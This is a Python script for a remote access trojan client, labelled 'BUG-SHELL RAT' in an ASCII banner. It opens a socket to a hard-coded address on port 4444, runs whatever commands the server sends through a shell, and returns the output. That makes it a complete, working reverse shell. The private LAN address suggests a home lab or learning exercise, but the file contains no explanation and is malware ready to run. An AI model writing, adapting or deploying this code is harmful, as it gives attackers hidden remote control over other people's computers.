import sys
import socket
import subprocess
from colorama import Fore, init
import os
import time

def print_ascii_art_slow(ascii_art, delay=0.2):
    init(autoreset=True)
    for line in ascii_art.split('\n'):
        colored_ascii_art = f"{Fore.BLUE}{line}{Fore.RESET}"
        print(colored_ascii_art)
        time.sleep(delay)

ascii_art = r"""
██████  ██    ██  ██████        ███████ ██   ██ ███████ ██      ██          ██████   █████  ████████ 
██   ██ ██    ██ ██             ██      ██   ██ ██      ██      ██          ██   ██ ██   ██    ██    
██████  ██    ██ ██   ███ █████ ███████ ███████ █████   ██      ██          ██████  ███████    ██    
██   ██ ██    ██ ██    ██            ██ ██   ██ ██      ██      ██          ██   ██ ██   ██    ██    
██████   ██████   ██████        ███████ ██   ██ ███████ ███████ ███████     ██   ██ ██   ██    ██    
                                                                                                     
                                                                                                                                                                                                                            
"""
print_ascii_art_slow(ascii_art)


SERVER = "192.168.1.171"
PORT = 4444

s = socket.socket()
s.connect((SERVER, PORT))
msg = s.recv(1024).decode()
print('server status: ', msg)

while True:
    cmd = s.recv(1024).decode()
    print(f'Received command: "{cmd}" from host server ({SERVER})')
    if cmd.lower() in ['q', 'quit', 'x', 'exit']:
        break

    try:
        result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        result = str(e).encode()

    if len(result) == 0:
        result = 'Command executed successfully'.encode()

    s.send(result)

s.close()